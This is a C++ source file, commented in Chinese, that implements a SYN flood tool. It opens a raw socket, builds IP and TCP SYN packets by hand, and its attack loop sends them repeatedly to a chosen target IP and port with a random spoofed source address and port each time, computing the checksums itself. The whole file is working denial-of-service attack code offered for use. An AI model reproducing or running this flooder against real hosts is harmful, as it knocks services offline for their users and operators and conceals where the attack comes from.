#include "synflood.h"
#include <iostream>
using namespace std;

u_int16_t check_sum(u_int16_t *buffer, int size);

SynFlood::SynFlood()
{
    srandom(time(nullptr));
}

SynFlood::~SynFlood()
{
    ip_header = nullptr;
    tcp_header = nullptr;
}

/*SynFlood初始化*/
int SynFlood::init(std::string ip_addr, int port)
{
    this->ip_addr = ip_addr;
    this->port = port;

    int res = initRawSocket();

    if(res!=0){
        return -1;
    }

    initIpData();

    return 0;
}

/*初始化rawSocket*/
int SynFlood::initRawSocket()
{
    // 创建对方地址信息
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
    addr.sin_port = htons(port);

    // 创建原始套接字,TCP
    socket_fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(socket_fd<0){
        perror("socket:");
        return -1;
    }
    cout << "sock:" << socket_fd  << endl;

    // 防止自动填充数据包
    int on = 1;
    int opt =  setsockopt(socket_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    if(opt<0){
        perror("opt:");
        return -1;
    }
    return 0;
}

/*初始化ip数据报*/
int SynFlood::initIpData()
{
    // 初始化ip数据报 ip_datagram(IP首部+TCP首部+TCP数据部分)
    memset(&ip_datagram,0,sizeof(ip_datagram));
    cout << "ip_datagram size :" << ip_datagram_len << endl;

    // 构建IP首部和TCP首部指针

    ip_header = (struct ip *)ip_datagram;
    tcp_header = (struct tcphdr *)(ip_datagram + sizeof(struct ip));//ip首部后面就是tcp报文段了

    /*封装ip首部*/
    // 版本 4
    ip_header->ip_v = IPVERSION;
    // 首部长度 4
    ip_header->ip_hl = sizeof(struct ip)>>2;
    // 服务类型(types of service) 8
    ip_header->ip_tos = 0;
    // 总长度 16
    ip_header->ip_len = htons(ip_datagram_len);
    // 标识 16
    ip_header->ip_id = 0;
    // 标志+偏移 16
    ip_header->ip_off = 0;
    // 生存时间 8
    ip_header->ip_ttl = 0;
    // 协议 8
    ip_header->ip_p = IPPROTO_TCP;
    // 首部检验和 16
    ip_header->ip_sum = 0;
    // 源地址(可伪造) 32
    //ip_header->ip_src.s_addr = inet_addr("127.0.0.1");
    // 目的地址 32
    ip_header->ip_dst = addr.sin_addr;

    /*封装tcp首部*/
    // 源端口 16 , 在syn攻击部分随机伪造端口
    //tcp_header->source = htons(m_port);
    // 目的端口 16
    tcp_header->dest = addr.sin_port;
    // 序号 32
    tcp_header->seq = 0;
    // 确认号 32
    tcp_header->ack_seq = 0;
    // 数据偏移 4
    //tcp_header->res1 = 0;
    // 保留 4
    tcp_header->doff = 5;  // 这里从wireshark来看是指的是数据偏移，resl和doff的位置反了，不知道是头文件有问题还是什么的，应该不是大小端问题。
    //res2+urg+ack+psh+rst+syn+fin 8
    //tcp_header->res2 = 0;
    //tcp_header->urg = 0;
    //tcp_header->ack = 0;
    //tcp_header->psh = 0;
    //tcp_header->rst = 0;
    tcp_header->syn = 1;
    //tcp_header->fin = 0;
    // 窗口 16
    //tcp_header->window = 0;
    // 检验和 16
    tcp_header->check = 0;
    // 紧急指针 16
    //tcp_header->urg_ptr = 0;
    return 0;
}


/*syn攻击*/
int SynFlood::attack(int flood_times)
{
    /*synFlood*/
    for(int i = 0 ; i < flood_times ; i++){
        // 伪造ip源地址
        u_int32_t m_ip = random();
        ip_header->ip_src.s_addr = htonl(m_ip);

        // 伪造tcp源端口
        tcp_header->source = htons(random());

        cout << "[伪造信息]ip:" << inet_ntoa(ip_header->ip_src) << " port:" << tcp_header->source << endl;

        /*计算tcp校验和*/
        ip_header->ip_ttl = 0;
        tcp_header->check = 0;

        // ip首部的校验和，内核会自动计算，可先作为伪首部，存放tcp长度
        ip_header->ip_sum = htons(sizeof(struct tcphdr));

        // 计算tcp校验和，从伪首部开始
        tcp_header->check = check_sum((u_int16_t *)ip_datagram+4,sizeof(ip_datagram)-8);

        ip_header->ip_ttl = MAXTTL;
        // 发送
        int res =  sendto(socket_fd,ip_datagram,ip_datagram_len,0,(sockaddr *)&addr,sizeof(struct sockaddr_in)) ;
        cout << res << endl;
        if(res<0){
            perror("res");
            return -1;
        }
        usleep(10000);
    }
    return 0;
}

u_int16_t check_sum(u_int16_t *buffer, int size)
{
    //建议将变量放入寄存器, 提高处理效率.
    register int len = size;
    //16bit
    register u_int16_t *p = buffer;
    //32bit
    register u_int32_t sum = 0;

    //16bit求和
    while( len >= 2)
    {
        sum += *(p++)&0x0000ffff;
        len -= 2;
    }

    //最后的单字节直接求和
    if( len == 1){
        sum += *((u_int8_t *)p);
    }

    //高16bit与低16bit求和, 直到高16bit为0
    while((sum&0xffff0000) != 0){
        sum = (sum>>16) + (sum&0x0000ffff);
    }
    return (u_int16_t)(~sum);
}
